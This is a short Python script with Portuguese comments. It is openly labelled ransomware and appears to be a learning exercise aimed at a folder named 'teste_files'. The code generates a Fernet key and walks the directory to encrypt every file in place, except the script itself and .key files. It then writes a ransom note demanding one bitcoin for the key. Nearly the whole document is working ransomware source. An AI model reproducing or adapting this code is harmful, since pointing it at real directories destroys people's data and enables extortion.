from cffi.ffiplatform import LIST_OF_FILE_NAMES
from cryptography.fernet import Fernet
import os

# Gerar uma chave criptografica e salvar

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# Carregar a chave salva

def carregar_chave():
    return open("chave.key", "rb").read()

#Criptografar um unico arquivo

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# Encontrar arquivos para critografar

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

# Mensagem de resgate

def criar_mensagem_resgate():
    with open("Leia_isso.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 1 bitcoin para o endereço x e envie o comprovante!\n")
        f.write("Depois disso enviaremos a chave para você recuperar seus dados")

# Execução

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("teste_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware executado! Arquivos critografados!")

if __name__ == "__main__":
    main()